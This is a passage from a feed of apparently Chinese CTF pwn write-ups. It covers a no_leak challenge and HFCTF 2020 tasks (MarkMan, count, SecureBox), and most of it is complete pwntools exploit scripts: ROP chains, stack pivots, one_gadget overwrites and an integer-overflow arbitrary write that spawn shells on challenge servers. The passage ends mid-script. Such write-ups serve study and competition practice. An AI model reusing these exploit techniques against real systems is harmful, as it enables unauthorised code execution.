    <content type="html"><![CDATA[<p>_do_global_dtors_aux中有一个gadgets可以修改stack上的数据，以达到可以代替64位的<code>ret2_dl_runtime_resolve</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@--name:/ctf/work/eonew/noleak<span class="comment"># ROPgadget --binary no_leak | grep rbp</span></span><br><span class="line">0x00000000004004b6 : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004004b5 : add byte ptr [rax], r8b ; pop rbp ; ret</span><br><span class="line">0x0000000000400517 : add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x00000000004004a9 : je 0x4004c0 ; pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x00000000004004eb : je 0x400500 ; pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x0000000000400512 : mov byte ptr [rip + 0x200af7], 1 ; pop rbp ; ret</span><br><span class="line">0x00000000004004b3 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000004004f5 : nop dword ptr [rax] ; pop rbp ; ret</span><br><span class="line">0x0000000000400515 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x00000000004004ab : pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x00000000004005cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005cf : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004b8 : pop rbp ; ret</span><br></pre></td></tr></table></figure><p><code>0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</code> 这个gadget位于</p><p>_do_global_dtors_aux中 只要控制rbp和edx的值就可以任意修改栈上的数据</p><h2 id="no-leak"><a href="#no-leak" class="headerlink" title="no_leak"></a>no_leak</h2><p>栈溢出，没有可泄露的函数，第一感觉是用<code>ret2_dl_runtime_resolve</code>,但尝试之后发现这道题在伪造调用<code>dl_runtime_resolve</code>的时候会跳转到一个未知的地方，而且溢出的字节有点少。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用思路如下:</p><p>1、栈迁移到bss上</p><p>2、调用libc_start_main，使得bss上残留下原本栈的信息，就会有真实地址在bss上分布</p><p>3、找一个能用的真实地址，利用神奇的gadget，把它伪造成system，再次回跳到main函数</p><p>4、栈溢出构造<code>system(&#39;/bin/sh&#39;)</code></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"no_leak"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'nc.eonew.cn'</span>, <span class="number">10002</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cus_rop</span><span class="params">(gadget1,gadget2,func_got,rdi,rsi,rdx)</span>:</span></span><br><span class="line">    payload = p64(gadget1)</span><br><span class="line">    payload += p64(<span class="number">0</span>) </span><br><span class="line">    payload += p64(<span class="number">0</span>)         <span class="comment">#rbx=0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)         <span class="comment">#rbp=1</span></span><br><span class="line">    payload += p64(func_got)  <span class="comment">#r12  call</span></span><br><span class="line">    payload += p64(rdi)       <span class="comment">#r13  rdx </span></span><br><span class="line">    payload += p64(rsi)       <span class="comment">#r14  rsi</span></span><br><span class="line">    payload += p64(rdx)       <span class="comment">#r15  edi </span></span><br><span class="line">    payload += p64(gadget2)</span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span>      <span class="comment">#tiao zheng zhan zhen</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line">gadget_reg = <span class="number">0x4005C6</span> </span><br><span class="line">gadget_call= <span class="number">0x4005B0</span></span><br><span class="line">magic_gadget = <span class="number">0x400518</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005D3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4005D1</span></span><br><span class="line">leave_ret = <span class="number">0x400564</span></span><br><span class="line">buf_address = elf.bss() + <span class="number">0x500</span></span><br><span class="line">fini = <span class="number">0x4005E0</span></span><br><span class="line">init = <span class="number">0x400570</span></span><br><span class="line">start = <span class="number">0x400450</span></span><br><span class="line"><span class="comment">#---------------</span></span><br><span class="line">dbg(<span class="number">0x400537</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'\x00'</span>*<span class="number">0x80</span> + p64(buf_address)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(buf_address) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">8</span></span><br><span class="line">payload += cus_rop(gadget_reg,gadget_call,elf.got[<span class="string">'__libc_start_main'</span>],start,fini,init)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#--------------- </span></span><br><span class="line">pause()</span><br><span class="line">payload  = <span class="string">'\x00'</span>*<span class="number">0x80</span> + p64(buf_address)</span><br><span class="line">payload += p64(<span class="number">0x4005Ca</span>)</span><br><span class="line">payload += p64(<span class="number">0xFFFFFFFFFFC5EE18</span>) <span class="comment">##(-0x3a11e8)^0xffffffffffffffff+1</span></span><br><span class="line">payload += p64(<span class="number">0x601458</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(magic_gadget)</span><br><span class="line">payload += p64(start)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#--------------- </span></span><br><span class="line">binsh = <span class="number">0x6012b0</span></span><br><span class="line">system = <span class="number">0x601458</span></span><br><span class="line">payload =<span class="string">'/bin/sh\x00'</span>+<span class="string">'b'</span>*<span class="number">0x80</span></span><br><span class="line">payload +=cus_rop(gadget_reg,gadget_call,system,binsh,fini,init)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>修改<code>0x601458</code>处的地址，经过加减得到<code>__libc_system</code></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/aux-1.png" class="lozad"></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/aux-2.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;_do_global_dtors_aux中有一个gadgets可以修改stack上的数据，以达到可以代替64位的&lt;code&gt;ret2_dl_runtime_resolve&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;t
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF pwn witeup</title>
    <link href="https://nocbtm.github.io/2020/04/20/HFCTF-pwn-witeup/"/>
    <id>https://nocbtm.github.io/2020/04/20/HFCTF-pwn-witeup/</id>
    <published>2020-04-20T01:31:03.000Z</published>
    <updated>2020-04-24T02:13:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题</p><h2 id="MarkMan"><a href="#MarkMan" class="headerlink" title="MarkMan"></a>MarkMan</h2><p>这个题耗费了太多时间，程序给了puts函数地址,存在一个任意地址写三字节，任意地址尝试了很多地方，刚开始想往stack上写未果，又往<code>dlopen</code>的<code>_dlfcn_hook</code> 上写未果，最终在exit函数会调用<code>_rtld_global</code>结构中的<code>_dl_rtld_lock_recursive</code>或者<code>_dl_rtld_unlock_recursive</code>处改写成功 ，并且因为<code>_dl_rtld_lock_recursive</code>指向的内容距离 <code>libc.address</code>过大，修改后三字节只会有几率成功</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level   = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = process(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment">#p=remote('39.97.210.182',10055)</span></span><br><span class="line">elf=ELF(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libc=ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *$rebase(0xcbc)\nb *$rebase(0xcc1)\nb *$rebase(0xd63)\n")</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"target near: 0x"</span>)</span><br><span class="line">leak=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc.address = leak - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">success(<span class="string">'leak =&gt; &#123;0&#125;'</span>.format(hex(leak)))</span><br><span class="line">success(<span class="string">'libc_address =&gt; &#123;0&#125;'</span>.format(hex(libc.address)))</span><br><span class="line"></span><br><span class="line">dlfcn_hook=libc.address+(<span class="number">0x15555532d0a0</span><span class="number">-0x155554d60000</span>)</span><br><span class="line">dl_rtld_lock_recursive=libc.address+(<span class="number">0x7f8a645fbf60</span><span class="number">-0x7f8a63dde000</span>)</span><br><span class="line">success(<span class="string">'dl_rtld_lock_recursive =&gt; &#123;0&#125;'</span>.format(hex(dl_rtld_lock_recursive)))</span><br><span class="line">success(<span class="string">'dlfcn_hook =&gt; &#123;0&#125;'</span>.format(hex(dlfcn_hook)))</span><br><span class="line">p.sendline(str(int(dl_rtld_lock_recursive)))</span><br><span class="line"></span><br><span class="line">payload=libc.address+one[<span class="number">1</span>]</span><br><span class="line">info(hex(payload))</span><br><span class="line">yi=payload&amp;<span class="number">0xff</span></span><br><span class="line">er=(payload&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">san=(payload&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">info(hex(yi))</span><br><span class="line">info(hex(er))</span><br><span class="line">info(hex(san))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(yi))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(er))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(san))</span><br><span class="line">p.sendline(<span class="string">"cat flag*"</span>)</span><br><span class="line">con=p.recv()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> con:</span><br><span class="line"><span class="keyword">print</span> con</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="count"><a href="#count" class="headerlink" title="count"></a>count</h2><p><code>arm aarch64</code>架构的题,搭建好qemu环境即可调试,题目很简单,不需要本地调试,直接利用IDA F5查看伪C代码即可写EXP<br>200次输入正确结果,利用python里面的eval函数即可自动计算结果,然后通过覆盖目标变量的值即可getshell</p><p>本地运行需要安装所需要的库 ,搜索aarch64的交叉编译的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  sudo apt-cache search aarch64</span><br><span class="line">cpp-5-aarch64-linux-gnu - GNU C preprocessor</span><br><span class="line">cpp-aarch64-linux-gnu - GNU C preprocessor (cpp) <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">g++-5-aarch64-linux-gnu - GNU C++ 编译器</span><br><span class="line">g++-aarch64-linux-gnu - GNU C++ compiler <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">gcc-5-aarch64-linux-gnu - GNU C 编译器</span><br><span class="line">gcc-5-aarch64-linux-gnu-base - GCC, the GNU Compiler Collection (base package)</span><br><span class="line">gcc-aarch64-linux-gnu - GNU C compiler <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">binutils-aarch64-linux-gnu - GNU binary utilities, <span class="keyword">for</span> aarch64-linux-gnu target</span><br><span class="line">qemu-system-arm - QEMU full system emulation binaries (arm)</span><br></pre></td></tr></table></figure><p>安装所需要的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-5-aarch64-linux-gnu gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    p = remote(<span class="string">'39.97.210.182'</span>,<span class="string">'40285'</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"pwn"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"pwn"</span>])</span><br><span class="line">    <span class="comment">#os.system("gdb -q -ex 'target remote localhost:1234' ")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>) :</span><br><span class="line">p. recvuntil(<span class="string">"~Math: "</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">" = "</span>)[:<span class="number">-3</span>]</span><br><span class="line">answer = eval(data)</span><br><span class="line">p. sendline(str(answer))</span><br><span class="line">payload= <span class="string">'a'</span>*<span class="number">0x64</span>+p64(<span class="number">0x12235612</span>)</span><br><span class="line">p. sendline(payload)</span><br><span class="line">p. interactive()</span><br></pre></td></tr></table></figure><h2 id="SecureBox"><a href="#SecureBox" class="headerlink" title="SecureBox"></a>SecureBox</h2><p>申请空间的函数,在判断size是否大于0xFFF的时候变量强制转化成了int类型,则有整型溢出,又当申请一个很大的空间的时候,由于空间肯定不够,最终不会申请,对应的指针位置为0,则此刻有了一个超大的size,以及指针以0为初始位置,即可实现任意写,最后将接受到的key值逆序与需要写的内容异或,通过enc函数则可往目标地址写上所需写的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LD <span class="keyword">import</span>*</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,sign = <span class="number">0</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size: '</span>,str(size))</span><br><span class="line">    <span class="keyword">if</span> sign:</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    p.recvuntil(<span class="string">'Key: \n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'ID: '</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(idx,off,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'ID: '</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Offset of msg: '</span>,str(off))</span><br><span class="line">    p.sendlineafter(<span class="string">'Len of msg: '</span>,<span class="string">'16'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Msg: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Box ID: '</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Offset of msg: '</span>,<span class="string">'0'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Len of msg: '</span>,<span class="string">'8'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Msg: \n'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.30.so'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">new(<span class="number">0x500</span>)</span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x500</span>)</span><br><span class="line">leak(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x60</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.info(<span class="string">'LIBC:\t'</span> + hex(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = [<span class="number">0xCB79A</span>,<span class="number">0xCB79D</span>,<span class="number">0xCB7A0</span>,<span class="number">0xE926B</span>, <span class="number">0xE9277</span>]  <span class="comment">#Kali 2.30</span></span><br><span class="line">rce = libc_base + one_gadget[<span class="number">3</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">new(<span class="number">0x7FFFFFFF00000000</span>+<span class="number">0xFF0</span>)</span><br><span class="line">rand_1 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">rand_2 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">randq_1 = <span class="string">''</span></span><br><span class="line">randq_2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>,<span class="number">-1</span>,<span class="number">-2</span>):</span><br><span class="line">randq_1 += (rand_1[i<span class="number">-1</span>] + rand_1[i])</span><br><span class="line">randq_2 += (rand_2[i<span class="number">-1</span>] + rand_2[i])</span><br><span class="line">rceq = (int(randq_1,<span class="number">16</span>) ^ rce)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">reallocq = (int(randq_2,<span class="number">16</span>) ^ realloc)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span 